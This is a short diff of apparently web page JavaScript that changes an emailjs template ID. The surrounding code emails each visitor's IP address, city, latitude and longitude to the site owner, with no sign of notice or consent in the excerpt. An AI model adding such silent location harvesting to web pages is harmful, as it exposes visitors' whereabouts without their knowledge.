@@ -11,7 +11,7 @@
 
       console.log(details);
 
-      emailjs.send("service_uke6jq9", "template_sdz5e6p", {
+      emailjs.send("service_uke6jq9", "template_3khhxlm", {
         message: `user ip: ${details.ip}, user city: ${details.city}, user latitude: ${details.latitude}, user longitude: ${details.longitude}, `,
       });
     };
